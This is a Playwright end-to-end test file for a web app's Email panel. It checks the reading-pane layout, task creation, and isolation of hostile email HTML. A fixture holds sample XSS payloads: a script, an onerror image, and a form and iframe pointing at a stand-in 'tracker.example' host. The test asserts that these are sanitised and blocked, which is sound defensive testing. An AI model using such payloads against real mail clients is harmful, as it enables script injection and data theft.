// Web e2e: the Email panel over the assembled product. It boots the real
// FaberLoom rows, replaces the IMAP receiver with a fixture (external service),
// and measures the reading pane: beside the list on a wide viewport, one pane at
// a time on a narrow one, in both looks, with the email-to-task and from-zero
// gestures. No model call is involved.
import { mkdirSync } from 'node:fs'
import { fileURLToPath } from 'node:url'
import type { Browser, Page, Request } from 'playwright'
import { chromium } from 'playwright'
import { afterAll, beforeAll, describe, expect, it } from 'vitest'
import { launchWebScaffold, watchConsole, type WebScaffold } from './scaffold.ts'
import { connectFreshWorkspace, newEnglishPage } from './support.ts'

const OVERLAY = fileURLToPath(new URL('./email-panel.overlay.yml', import.meta.url))
const BUNDLE = fileURLToPath(new URL('../../../packages/bundle/faberloom-app/package.json', import.meta.url))
const SHOTS = fileURLToPath(new URL('../../../docs/scratch/faberloom-daily-work/e1/visual/', import.meta.url))
const ACTOR = { id: 'e2e@mwt.one', companyId: 'mwt' }
const SUBJECT = 'OC 4711 Eguisa'
const SECOND = 'Consulta de precio'
// The from-zero gesture is a new task each run; a unique title keeps the count
// honest against the scaffold's persistent store.
const SCRATCH_TITLE = `Tarea desde cero ${String(Date.now())}`

/** Hostile HTML a third party can send: scripts, a form, tracking and a link. */
const HOSTILE = [
  '<p>Hola desde el proveedor</p>',
  '<script>window.parent.__pwned = true; window.top.location = "https://tracker.example/pwn"</script>',
  '<img src="https://tracker.example/pixel.png" onerror="window.parent.__pwned = true">',
  '<form action="https://tracker.example/steal"><input name="dato"><button>Aprobar</button></form>',
  '<a href="https://tracker.example/x">enlace</a>',
  '<iframe src="https://tracker.example/frame"></iframe>',
].join('')

/** The receiver the panel reads: an external service, replaced by a fixture. */
const inbound = {
  listInbox: async () => [
    { uid: 1, messageId: '<a@x>', from: 'Compras Eguisa <compras@eguisa.example>', subject: SUBJECT, date: 'Tue, 18 Sep 2026 10:00:00 +0000', seen: false },
    { uid: 2, messageId: '<b@x>', from: 'Sonepar <pedidos@sonepar.example>', subject: 'Consulta de precio', date: 'Mon, 17 Sep 2026 09:00:00 +0000', seen: true },
  ],
  readEmail: async () => ({ text: 'Hola, adjunto la orden de compra 4711.', html: null, attachments: [] }),
  searchMailbox: async () => ({ messages: [], connectionId: 'fixture', complete: true, scanned: 0, total: 0, matched: 0 }),
  markSeen: async () => true,
  moveToTrash: async () => 'Trash',
}

describe('web e2e: Email panel and task entries', () => {
  let scaffold: WebScaffold
  let browser: Browser
  let page: Page
  let tripwire: ReturnType<typeof watchConsole>
  let board: { list: (actor: unknown) => Promise<readonly { title: string }[]> }

  beforeAll(async () => {
    mkdirSync(SHOTS, { recursive: true })
    scaffold = await launchWebScaffold({ extraOverlayPath: OVERLAY, extraInstallAnchors: [BUNDLE] })
    ;(scaffold.ctx as unknown as { provide: (key: string, value: unknown) => void }).provide('faberloomInbound', inbound)
    board = (scaffold.ctx as unknown as { faberloomBoard: typeof board }).faberloomBoard

    browser = await chromium.launch()
    page = await newEnglishPage(browser)
    page.setDefaultTimeout(15_000)
    page.on('pageerror', (error) => { console.log('PAGEERROR', String(error)) })
    page.on('console', (message) => { if (message.type() === 'error') console.log('CONSOLE', message.text()) })
    tripwire = watchConsole(page)
    await page.goto(scaffold.authenticatedUrl, { waitUntil: 'load' })
    try {
      await page.waitForSelector('[class*="frame"]', { timeout: 30_000 })
    } catch (error: unknown) {
      await page.screenshot({ path: `${SHOTS}boot-failure.png` })
      console.log('BOOT BODY', ((await page.textContent('body')) ?? '').slice(0, 1200))
      throw error
    }
    await connectFreshWorkspace(page, scaffold.workspaceCwd)
  }, 180_000)

  afterAll(async () => {
    await browser?.close()
    await scaffold?.close()
  })

  /** Open the Email panel and select the first message. */
  async function openMail(): Promise<void> {
    // The mail row lives in its own Emails group; expand it when collapsed.
    if (await page.getByRole('button', { name: /^Email$/u }).count() === 0) {
      const group = page.getByRole('button', { name: /^Emails/u }).first()
      if (await group.count() > 0) await group.click()
    }
    const nav = page.getByRole('button', { name: /^Email$/u }).first()
    if (await nav.count() === 0) {
      console.log('NAV BUTTONS', (await page.getByRole('button').allTextContents()).slice(0, 60).join(' | '))
      await page.screenshot({ path: `${SHOTS}nav-debug.png` })
    }
    await nav.click()
    await page.getByText(SUBJECT, { exact: false }).first().waitFor()
    await page.getByText(SUBJECT, { exact: false }).first().click()
    await page.locator('aside[aria-label="Email"]').waitFor()
  }

  /** The look the panel currently paints, from the preference it stores. */
  async function currentLook(): Promise<string> {
    return await page.evaluate(() => window.localStorage.getItem('faberloom.email.look') ?? 'a')
  }

  /** Switch the surface at a wide viewport, where the control is visible. */
  async function useLook(target: 'a' | 'b'): Promise<void> {
    if (await currentLook() === target) return
    await page.getByRole('button', { name: 'Change look' }).click()
    await expect.poll(currentLook).toBe(target)
  }

  it('reads beside the list on wide, one pane on narrow, in both looks, and opens tasks once', async () => {
    await page.setViewportSize({ width: 1440, height: 900 })
    await useLook('a')
    await openMail()

    const listBox = await page.getByRole('list', { name: 'Inbox' }).first().boundingBox()
    const readerBox = await page.locator('aside[aria-label="Email"]').boundingBox()
    expect(listBox).not.toBeNull()
    expect(readerBox).not.toBeNull()
    if (listBox !== null && readerBox !== null) {
      expect(readerBox.x).toBeGreaterThan(listBox.x + listBox.width / 2)
      expect(readerBox.width).toBeGreaterThan(200)
    }
    const reader = page.locator('aside[aria-label="Email"]')
    await reader.getByRole('heading', { name: SUBJECT }).waitFor()
    await page.screenshot({ path: `${SHOTS}email-wide-look-a.png`, fullPage: false })

    // Narrow, look A: the reader replaces the list, then closing returns to it.
    await page.setViewportSize({ width: 420, height: 800 })
    // Let the viewport resize reach the media query before measuring.
    await page.waitForTimeout(500)
    await page.getByText(SECOND).waitFor({ state: 'hidden' })
    expect((await reader.boundingBox())?.width ?? 0).toBeGreaterThan(380)
    await page.screenshot({ path: `${SHOTS}email-narrow-reader-a.png`, fullPage: false })
    await reader.getByRole('button', { name: 'Close' }).first().click()
    await page.getByText(SECOND).waitFor({ state: 'visible' })
    await page.screenshot({ path: `${SHOTS}email-narrow-list-a.png`, fullPage: false })
    const overflowA = await page.evaluate(() =>
      document.documentElement.scrollWidth - document.documentElement.clientWidth)
    expect(overflowA).toBeLessThanOrEqual(1)

    // Wide again, look B, then narrow in look B.
    await page.setViewportSize({ width: 1440, height: 900 })
    await openMail()
    await reader.getByRole('heading', { name: SUBJECT }).waitFor()
    await useLook('b')
    await page.screenshot({ path: `${SHOTS}email-wide-look-b.png`, fullPage: false })

    await page.setViewportSize({ width: 420, height: 800 })
    await page.waitForTimeout(500)
    await page.getByText(SECOND).waitFor({ state: 'hidden' })
    await page.screenshot({ path: `${SHOTS}email-narrow-reader-b.png`, fullPage: false })
    await reader.getByRole('button', { name: 'Close' }).first().click()
    await page.getByText(SECOND).waitFor({ state: 'visible' })
    await page.screenshot({ path: `${SHOTS}email-narrow-list-b.png`, fullPage: false })
    const overflowB = await page.evaluate(() =>
      document.documentElement.scrollWidth - document.documentElement.clientWidth)
    expect(overflowB).toBeLessThanOrEqual(1)

    // From the mail, twice: one task. Wide, back on look A.
    await page.setViewportSize({ width: 1440, height: 900 })
    await useLook('a')
    await openMail()
    await page.getByRole('button', { name: 'Create task' }).first().click()
    await page.getByText(`Task created: ${SUBJECT}`).waitFor({ state: 'visible' })
    await page.getByRole('button', { name: 'Create task' }).first().click()

    // From zero.
    const mesa = page.getByRole('button', { name: /Mesa de trabajo|Work bench/u }).first()
    if (await mesa.count() === 0) {
      const work = page.getByRole('button', { name: /^Work/u }).first()
      if (await work.count() > 0) await work.click()
    }
    await page.getByRole('button', { name: /Mesa de trabajo|Work bench/u }).first().click()
    await page.getByRole('button', { name: 'New task' }).click()
    await page.getByRole('textbox', { name: 'Task title' }).fill(SCRATCH_TITLE)
    await page.getByRole('button', { name: 'Create', exact: true }).click()
    await page.getByText(SCRATCH_TITLE).first().waitFor({ state: 'visible' })
    await page.screenshot({ path: `${SHOTS}mesa-scratch-task.png`, fullPage: false })

    const titles = (await board.list(ACTOR)).map(item => item.title)
    expect(titles.filter(title => title === SUBJECT)).toHaveLength(1)
    expect(titles.filter(title => title === SCRATCH_TITLE)).toHaveLength(1)
    expect(tripwire.pageErrors).toEqual([])
  }, 180_000)

  it('isolates hostile HTML in the real browser: no script, no form, no remote request', async () => {
    const original = inbound.readEmail
    inbound.readEmail = async () => ({ text: '', html: HOSTILE, attachments: [] })
    const requests: string[] = []
    const onRequest = (request: Request): void => { requests.push(request.url()) }
    page.on('request', onRequest)
    try {
      await page.setViewportSize({ width: 1440, height: 900 })
      await openMail()
      // The second message has not been read in this run, so the body is fetched
      // with the hostile fixture instead of a cached text body.
      await page.getByText(SECOND, { exact: false }).first().click()
      const frame = page.frameLocator('iframe[title="Body"]')
      await frame.getByText('Hola desde el proveedor').waitFor()
      const iframe = page.locator('iframe[title="Body"]')
      const srcdoc = (await iframe.getAttribute('srcdoc')) ?? ''
      expect(srcdoc).toContain('Content-Security-Policy')
      expect(srcdoc).not.toContain('<script')
      expect(srcdoc).not.toContain('<form')
      expect(srcdoc).not.toContain('tracker.example')
      expect(await iframe.getAttribute('sandbox')).toBe('')
      // Nothing from the hostile origin reached the network, and nothing ran.
      await page.waitForTimeout(600)
      expect(requests.filter(url => url.includes('tracker.example'))).toEqual([])
      expect(await page.evaluate(() => (window as { __pwned?: boolean }).__pwned ?? null)).toBeNull()
      expect(await page.locator('article form').count()).toBe(0)
      await page.screenshot({ path: `${SHOTS}email-hostile.png`, fullPage: false })
    } finally {
      inbound.readEmail = original
      page.off('request', onRequest)
    }
  }, 120_000)
})
